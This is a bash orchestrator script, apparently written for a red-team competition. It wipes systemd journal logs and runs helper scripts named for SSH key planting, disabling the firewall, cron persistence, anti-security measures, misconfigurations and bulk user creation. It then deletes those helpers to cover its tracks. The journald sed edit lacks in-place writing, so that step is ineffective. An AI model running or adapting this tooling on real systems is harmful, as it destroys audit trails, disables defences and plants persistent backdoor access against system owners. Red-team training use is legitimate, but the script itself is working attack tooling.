#!/bin/bash

#clear journalctl logs
sed 's/Storage=auto/Storage=0/' /etc/systemd/journald.conf

sudo systemctl restart systemd-journald

sudo journalctl --rotate
sudo journalctl --vacuum-time=1s


SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"

bash "${SCRIPT_DIR}"/keyPlanting.sh
bash "${SCRIPT_DIR}"/firewallOff.sh
sudo "${SCRIPT_DIR}"/cronPersistence.sh
bash "${SCRIPT_DIR}"/antiSE.sh
bash "${SCRIPT_DIR}"/miscon.sh
bash "${SCRIPT_DIR}"/bulkUser.sh

# ── Post-deploy cleanup: remove one-shot scripts (keep only what persistence/cron calls) ──
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
REMOVE_SCRIPTS=(
    "keyPlanting.sh"
    "firewallOff.sh"
    "cronPersistence.sh"
    "antiSE.sh"
    "miscon.sh"
    "bulkUser.sh"
)
for f in "${REMOVE_SCRIPTS[@]}"; do
    path="${SCRIPT_DIR}/${f}"
    if [ -f "$path" ]; then
        rm -f "$path"
        echo "[RED TEAM] Cleaned up (removed): $f"
    fi
done
# Optional: remove orchestrator so no deploy scripts remain
# rm -f "${SCRIPT_DIR}/LetTheMadnessBegin.sh"
# echo "[RED TEAM] Cleaned up: LetTheMadnessBegin.sh"